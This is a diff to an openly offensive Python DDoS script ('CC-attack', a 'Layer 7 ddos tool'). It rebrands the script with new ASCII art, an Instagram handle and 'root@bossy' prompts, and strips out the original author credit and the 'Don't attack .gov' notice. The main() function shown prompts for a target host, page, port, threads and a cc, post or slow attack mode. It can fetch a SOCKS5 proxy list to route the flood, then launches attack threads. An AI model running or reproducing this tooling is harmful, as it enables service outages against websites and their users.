@@ -1,5 +1,11 @@
 #!/usr/bin/python3
-#Coded by Leeon123
+#############################
+# ___  _ _     ___  ____  _  #
+# \  \/// \  /|\  \//\  \//  #
+#  \  / | |\ || \  /  \  /   #
+#  /  \ | | \|| /  \  /  \   #
+# /__/\\\_/  \|/__/\\/__/\\  #
+#############################                         
 import requests
 import socket
 import socks
@@ -10,23 +16,13 @@ import sys
 import ssl
 
 print ('''
-       /////    /////    /////////////
-      CCCCC/   CCCCC/   | CC-attack |/
-     CC/      CC/       |-----------|/ 
-     CC/      CC/       |  Layer 7  |/ 
-     CC/////  CC/////   | ddos tool |/ 
-      CCCCC/   CCCCC/   |___________|/
->--------------------------------------------->
-Python3 version 1.9 (Add Socks5 Checker)
-                            C0d3d by Lee0n123
-===============================================
-       --> Use 443 Port Auto Enable SSL <--
-                    Tos:
-          Don't attack .gov website
-           + Changed proxies api
-           + Improved Slow mode
-           + Added Socks5 checker
-===============================================''')
+___  _ _     ___  ____  _
+\  \/// \  /|\  \//\  \//
+ \  / | |\ || \  /  \  / 
+ /  \ | | \|| /  \  /  \ 
+/__/\\\_/  \|/__/\\/__/\\
+      Instagram : @0zctn
+                         ''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -363,43 +359,43 @@ def main():
 	global port
 	global proxies
 	global multiple
-	mode = str(input("> Choose Your Mode (cc/post/slow) : "))
-	ip = str(input("> Host/Ip : "))
+	mode = str(input("root@bossy:~# Choose Your Mode (cc/post/slow) : "))
+	ip = str(input("root@bossy:~# [Host/Ip] : "))
 	if mode == "slow":
 		pass
 	else:
-		url = str(input("> Page You Want To Attack(default=/) : "))
-	port = str(input("> Port ( Https Default is 443) : "))
+		url = str(input("root@bossy:~# Page You Want To Attack ( default=/ ) : "))
+	port = str(input("root@bossy:~# Port ( Https Default Is 443 ) : "))
 	if port == '':
 		port = int(80)
-		print("> Default Choose Port 80\r\n> Port 80 was chosen")
+		print("root@bossy:~# Default Choose Port 80\r\n> Port 80 Was Chosen")
 	else:
 		port = int(port)
 		if str(port) == '443':
-			print(" [!] Enable SSL Mode")
-	thread_num = int(input("> Threads : "))
-	N = str(input("> Do You Need To Get Socks5 List?(y/n):"))
+			print("root@bossy:~# [!] Enable SSL Mode")
+	thread_num = int(input("root@bossy:~# Threads : "))
+	N = str(input("root@bossy:~# Do You Need To Get Socks5 List ? (Y/n) : "))
 	if N == 'y':
 		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
 		with open("socks.txt",'wb') as f:
 			f.write(r.content)
-			print("\r\n [!] Have Already Download Socks5 List As socks.txt\r\n")
+			print("\r\n root@bossy:~# [!] Have Already Download Socks5 List As socks.txt\r\n")
 	else:
 		pass
-	out_file = str(input("> Proxy File Path (socks.txt): "))
+	out_file = str(input("root@bossy:~# Proxy File Path ( socks.txt ) : "))
 	if out_file == '':
 		out_file = str("socks.txt")
 	else:
 		out_file = str(out_file)
 	proxies = open(out_file).readlines()
-	print ("> Number Of Proxies: %s" %(len(proxies)))
+	print ("root@bossy:~# Number Of Proxies : %s" %(len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Do u need to check socks list?(y/n)"))
+	ans = str(input("root@bossy:~# Do U Need To Check Socks List ? (Y/n) "))
 	if ans == "y":
 		check_socks()
 	if mode == "slow":
 		slow(thread_num)
-	multiple = int(input("> Input The Magnification:"))
+	multiple = int(input("root@bossy:~# Input The Magnification (100) : "))
 	if url == '':
 		url2 = "/"
 	else:
@@ -413,7 +409,7 @@ def main():
 			th = threading.Thread(target = cc)
 			th.start()
 	else:
-		print("[!] Input Error")
+		print("root@bossy:~# [!] Input Error")
 		sys.exit()
 
 if __name__ == "__main__":
